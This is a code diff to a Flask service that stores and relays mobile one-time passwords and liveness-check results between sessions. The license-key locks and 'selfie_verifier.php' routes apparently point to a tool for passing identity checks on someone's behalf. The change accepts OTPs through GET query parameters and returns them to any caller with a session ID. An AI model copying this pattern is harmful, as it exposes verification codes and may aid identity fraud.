@@ -985,46 +985,75 @@ def submit_liveness():
         if s_str:
             s = json.loads(s_str)
             s['status'] = 'COMPLETED'
-            s['event_session_id'] = payload.get('event_session_id')
+            event_id = payload.get('event_session_id')
+            s['event_session_id'] = event_id
+            if event_id:
+                redis.set(f"event_sid:{event_id}", sid, ex=86400)
             key = s.get('license_key')
             if key and redis.get(f"active_session_lock:{key}") == sid: redis.delete(f"active_session_lock:{key}")
             redis.set(sid, json.dumps(s), ex=86400)
         return jsonify({"success": True})
     except Exception as e: return jsonify({"success": False, "message": str(e)}), 500
 
-@app.route('/api/submit_mobile_otp', methods=['POST'])
-@app.route('/api/submit_mobile_otp.php', methods=['POST'])
+@app.route('/api/submit_mobile_otp', methods=['POST', 'GET'])
+@app.route('/api/submit_mobile_otp.php', methods=['POST', 'GET'])
 def submit_mobile_otp():
     try:
         try: raw = request.data.decode('utf-8'); payload = json.loads(base64.b64decode(raw).decode('utf-8'))
-        except: payload = request.json or {}
+        except: payload = request.json or request.args or {}
         sid = payload.get('session_id')
         otp = payload.get('mobile_otp')
         if not sid or not otp:
             return jsonify({"success": False, "message": "Missing session_id or mobile_otp"}), 400
+        
         s_str = redis.get(sid)
+        if not s_str:
+            alt_sid = redis.get(f"event_sid:{sid}")
+            if alt_sid:
+                sid = alt_sid.decode('utf-8') if isinstance(alt_sid, bytes) else alt_sid
+                s_str = redis.get(sid)
+
         if s_str:
             s = json.loads(s_str)
-            s['mobile_otp'] = str(otp).strip()
+            clean_otp = str(otp).strip()
+            s['mobile_otp'] = clean_otp
             redis.set(sid, json.dumps(s), ex=86400)
+            if s.get('event_session_id'):
+                redis.set(f"event_sid:{s.get('event_session_id')}", sid, ex=86400)
+                redis.set(f"otp_by_event:{s.get('event_session_id')}", clean_otp, ex=86400)
             return jsonify({"success": True, "message": "Mobile OTP submitted successfully"})
         return jsonify({"success": False, "message": "Session not found"}), 404
     except Exception as e:
         return jsonify({"success": False, "message": str(e)}), 500
 
-@app.route('/api/check_session_status', methods=['POST'])
+@app.route('/api/check_session_status', methods=['POST', 'GET'])
+@app.route('/api/check_session_status.php', methods=['POST', 'GET'])
+@app.route('/api/selfie_verifier.php', methods=['POST', 'GET'])
 def check_session_status():
     try:
         try: raw = request.data.decode('utf-8'); payload = json.loads(base64.b64decode(raw).decode('utf-8'))
-        except: payload = request.json or {}
-        s_str = redis.get(payload.get('session_id'))
-        if not s_str: return jsonify({"success": False})
+        except: payload = request.json or request.args or {}
+        sid = payload.get('session_id')
+        if not sid: return jsonify({"success": False, "message": "Missing session_id"})
+        s_str = redis.get(sid)
+        if not s_str:
+            alt_sid = redis.get(f"event_sid:{sid}")
+            if alt_sid:
+                sid = alt_sid.decode('utf-8') if isinstance(alt_sid, bytes) else alt_sid
+                s_str = redis.get(sid)
+        if not s_str: return jsonify({"success": False, "message": "Session not found"})
         s = json.loads(s_str)
+        otp = s.get('mobile_otp')
+        if not otp and s.get('event_session_id'):
+            ev_otp = redis.get(f"otp_by_event:{s.get('event_session_id')}")
+            if ev_otp:
+                otp = ev_otp.decode('utf-8') if isinstance(ev_otp, bytes) else ev_otp
+                s['mobile_otp'] = otp
         return base64.b64encode(json.dumps({
             "success": True, "data": {
                 "status": s.get('status'),
                 "event_session_id": s.get('event_session_id'),
-                "mobile_otp": s.get('mobile_otp')
+                "mobile_otp": otp
             }
         }).encode('utf-8')).decode('utf-8')
     except Exception as e: return jsonify({"success": False, "message": str(e)}), 500
